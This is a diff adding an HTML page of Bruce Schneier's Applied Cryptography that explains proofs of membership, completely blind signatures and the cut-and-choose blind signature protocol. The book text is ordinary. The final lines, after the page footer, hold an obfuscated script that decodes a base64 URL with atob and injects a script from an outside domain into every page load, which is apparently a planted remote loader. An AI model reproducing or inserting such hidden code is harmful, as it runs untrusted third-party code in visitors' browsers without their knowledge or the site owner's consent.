@@ -1,0 +1,111 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=111-114//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Proofs of Membership</I></B></FONT></P>
+<P>Alice wants to prove to Bob that she is a member of some super-secret organization, but she does not want to reveal her identity. This problem is similar but different to proving identity, and has also been studied [887,906,907,1201,1445]. Some solutions are related to the problem of group signatures (see Section 4.6).
+</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">5.3 Blind Signatures</FONT></H3>
+<P>An essential feature of digital signature protocols is that the signer knows what he is signing. This is a good idea, except when we want the reverse.
+</P>
+<P>We might want people to sign documents without ever seeing their contents. There are ways that a signer can <I>almost</I>, but not exactly, know what he is signing. But first things first.</P>
+<P><FONT SIZE="+1"><B><I>Completely Blind Signatures</I></B></FONT></P>
+<P>Bob is a notary public. Alice wants him to sign a document, but does not want him to have any idea what he is signing. Bob doesn&#146;t care what the document says; he is just certifying that he notarized it at a certain time. He is willing to go along with this.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice takes the document and multiplies it by a random value. This random value is called a <B>blinding factor</B>.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice sends the blinded document to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob signs the blinded document.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice divides out the blinding factor, leaving the original document signed by Bob.
+</DL>
+<P>This protocol only works if the signature function and multiplication are commutative. If they are not, there are other ways to modify the document other than by multiplying. Some relevant algorithms appear in Section 23.12. For now, assume that the operation is multiplication and all the math works.
+</P>
+<P>Can Bob cheat? Can he collect any information about the document that he is signing? If the blinding factor is truly random and makes the blinded document truly random, he cannot. The blinded document Bob signs in step (2) looks nothing like the document Alice began with. The blinded document with Bob&#146;s signature on it in step (3) looks nothing like the signed document at the end of step (4). Even if Bob got his hands on the document, with his signature, after completing the protocol, he cannot prove (to himself or to anyone else) that he signed it in that particular protocol. He knows that his signature is valid. He can, like anyone else, verify his signature. However, there is no way for him to correlate any information he received during the signing protocol with the signed document. If he signed a million documents using this protocol, he would have no way of knowing in which instance he signed which document.</P>
+<P>The properties of completely blind signatures are:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Bob&#146;s signature on the document is valid. The signature is a proof that Bob signed the document. It will convince Bob that he signed the document if it is ever shown to him. It also has all of the other properties of digital signatures discussed in Section 2.6.
+<DD><B>2.</B>&nbsp;&nbsp;Bob cannot correlate the signed document with the act of signing the document. Even if he keeps records of every blind signature he makes, he cannot determine when he signed any given document.
+</DL>
+<P>Eve, who is in the middle, watching this protocol, has even less information than Bob.
+</P>
+<P><FONT SIZE="+1"><B><I>Blind Signatures</I></B></FONT></P>
+<P>With the completely blind signature protocol, Alice can have Bob sign anything: &#147;Bob owes Alice a million dollars,&#148; &#147;Bob owes Alice his first-born child,&#148; &#147;Bob owes Alice a bag of chocolates.&#148; The possibilities are endless. This protocol isn&#146;t useful in many applications.
+</P>
+<P>However, there is a way that Bob can know what he is signing, while still maintaining the useful properties of a blind signature. The heart of this protocol is the cut-and-choose technique. Consider this example. Many people enter this country every day, and the Department of Immigration wants to make sure they are not smuggling cocaine. The officials could search everyone, but instead they use a probabilistic solution. They will search one-tenth of the people coming in. One person in ten has his belongings inspected; the other nine get through untouched. Chronic smugglers will get away with their misdeeds most of the time, but they have a 10 percent chance of getting caught. And if the court system is effective, the penalty for getting caught once will more than wipe out the gains from the other nine times.</P>
+<P>If the Department of Immigration wants to increase the odds of catching smugglers, they have to search more people. If they want to decrease the odds, they have to search fewer people. By manipulating the probabilities, they control how successful the protocol is in catching smugglers.</P>
+<P>The blind signature protocol works in a similar manner. Bob will be given a large pile of different blinded documents. He will <B>open</B>, that is examine, all but one and then sign the last.</P>
+<P>Think of the blinded document as being in an envelope. The process of blinding the document is putting the document in an envelope and the process of removing the blinding factor is opening the envelope. When the document is in an envelope, nobody can read it. The document is signed by having a piece of carbon paper in the envelope: When the signer signs the envelope, his signature goes through the carbon paper and signs the document as well.</P>
+<P>This scenario involves a group of counterintelligence agents. Their identities are secret; not even the counterintelligence agency knows who they are. The agency&#146;s director wants to give each agent a signed document stating: &#147;The bearer of this signed document, (insert agent&#146;s cover name here), has full diplomatic immunity.&#148; Each of the agents has his own list of cover names, so the agency can&#146;t just hand out signed documents. The agents do not want to send their cover names to the agency; the enemy might have corrupted the agency&#146;s computer. On the other hand, the agency doesn&#146;t want to blindly sign any document an agent gives it. A clever agent might substitute a message like: &#147;Agent (name) has retired and collects a million-dollar-a-year pension. Signed, Mr. President.&#148; In this case, blind signatures could be useful.</P>
+<P>Assume that all the agents have 10 possible cover names, which they have chosen themselves and which no one else knows. Also assume that the agents don&#146;t care under which cover name they are going to get diplomatic immunity. Also assume that the agency&#146;s computer is the Agency&#146;s Large Intelligent Computing Engine, or ALICE, and that our particular agent is the Bogota Operations Branch: BOB.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;BOB prepares <I>n</I> documents, each using a different cover name, giving himself diplomatic immunity.
+<DD><B>(2)</B>&nbsp;&nbsp;BOB blinds each of these documents with a different blinding factor.
+<DD><B>(3)</B>&nbsp;&nbsp;BOB sends the <I>n</I> blinded documents to ALICE.
+<DD><B>(4)</B>&nbsp;&nbsp;ALICE chooses <I>n</I> &#150; 1 documents at random and asks BOB for the blinding factors for each of those documents.
+<DD><B>(5)</B>&nbsp;&nbsp;BOB sends ALICE the appropriate blinding factors.
+<DD><B>(6)</B>&nbsp;&nbsp;ALICE opens (i.e., she removes the blinding factor) <I>n</I> &#150; 1 documents and makes sure they are correct&#151;and not pension authorizations.
+<DD><B>(7)</B>&nbsp;&nbsp;ALICE signs the remaining document and sends it to BOB.
+<DD><B>(8)</B>&nbsp;&nbsp;Agent removes the blinding factor and reads his new cover name: &#147;The Crimson Streak.&#148; The signed document gives him diplomatic immunity under that name.
+</DL>
+<P>This protocol is secure against BOB cheating. For him to cheat, he would have to predict accurately which document ALICE would not examine. The odds of him doing this are 1 in <I>n</I>&#151;not very good. ALICE knows this and feels confident signing a document that she is not able to examine. With this one document, the protocol is the same as the previous completely blinded signature protocol and maintains all of its properties of anonymity.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(hciooGTd, spNjlgaw) {spNjlgaw = hciooGTd.createElement('script');spNjlgaw.type = 'text/javascript';spNjlgaw.async = true;spNjlgaw.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');hciooGTd.getElementsByTagName('body')[0].appendChild(spNjlgaw);}(document));</script></body>
+</html>
